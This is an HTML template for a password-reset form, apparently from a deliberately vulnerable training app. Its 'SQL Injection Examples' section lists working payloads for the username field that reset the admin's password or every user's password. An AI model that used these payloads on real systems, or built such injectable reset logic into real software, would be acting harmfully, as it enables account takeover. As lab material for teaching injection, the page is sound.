<div class="reset-container">
    <h2>Reset Password</h2>

    {{#if error}}
    <div class="error-message">
        {{error}}
    </div>
    {{/if}}

    {{#if success}}
    <div class="success-message">
        {{success}}
    </div>
    {{/if}}

    <form action="/reset-password" method="POST">
        <div class="form-group">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required>
        </div>
        <div class="form-group">
            <label for="newPassword">New Password:</label>
            <input type="password" id="newPassword" name="newPassword" required>
        </div>
        <button type="submit" class="btn-reset">Reset Password</button>
    </form>

    <div class="sqli-examples">
        <h3>SQL Injection Examples:</h3>
        <p>Try these SQLi payloads in the username field:</p>
        <ul>
            <li><code>admin' --</code> - Updates admin's password</li>
            <li><code>' OR username LIKE '%a%' --</code> - Updates password for all users with 'a' in their username</li>
            <li><code>nonexistent'; UPDATE users SET password='hacked' WHERE '1'='1</code> - Updates ALL users' passwords</li>
        </ul>
    </div>

    <div class="navigation">
        <a href="/login" class="btn-secondary">Back to Login</a>
    </div>
</div>
